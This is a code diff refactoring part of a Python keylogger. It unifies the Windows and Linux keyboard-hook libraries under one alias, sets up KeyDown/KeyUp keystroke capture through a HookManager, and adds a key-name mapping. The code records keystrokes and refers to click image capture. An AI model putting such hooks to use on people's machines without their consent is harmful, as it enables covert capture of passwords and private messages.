@@ -24,9 +24,9 @@ import os
 import time
 import sys
 if os.name == 'posix':
-    import pyxhook
+    import pyxhook as hooklib
 elif os.name == 'nt':
-    import pyHook
+    import pyHook as hooklib
     import pythoncom
 else:
     print "OS is not recognised as windows or linux."
@@ -60,14 +60,14 @@ class KeyLogger:
         self.q = Queue.Queue(0)
         self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
         self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
-        if os.name == 'nt':
-            self.hm = pyHook.HookManager()
-            self.hm.KeyDown = self.OnKeyDownEvent
-            self.hm.KeyUp = self.OnKeyUpEvent
-            if self.settings['General']['Hook Keyboard'] == True:
-                self.hm.HookKeyboard()
-        elif os.name == 'posix':
-            self.hm = pyxhook.pyxhook(captureclicks = self.settings['Image Capture']['Capture Clicks'], clickimagedimensions = {"width":self.settings['Image Capture']['Capture Clicks Width'], "height":self.settings['Image Capture']['Capture Clicks Height']}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
+        #if os.name == 'nt':
+        self.hm = hooklib.HookManager()
+        self.hm.KeyDown = self.OnKeyDownEvent
+        self.hm.KeyUp = self.OnKeyUpEvent
+        if self.settings['General']['Hook Keyboard'] == True:
+            self.hm.HookKeyboard()
+        #~ elif os.name == 'posix':
+            #~ self.hm = pyxhook.pyxhook(captureclicks = self.settings['Image Capture']['Capture Clicks'], clickimagedimensions = {"width":self.settings['Image Capture']['Capture Clicks Width'], "height":self.settings['Image Capture']['Capture Clicks Height']}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
         
         #if self.options.hookMouse == True:
         #   self.hm.HookMouse()
@@ -210,7 +210,8 @@ class ControlKeyHash:
                                     'Shift_l':'Lshift',
                                     'Shift_r':'Rshift',
                                     'Super_l':'Lwin',
-                                    'Super_r':'Rwin'}
+                                    'Super_r':'Rwin',
+                                    'Page_up':'Prior'}
                                     
         win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
         
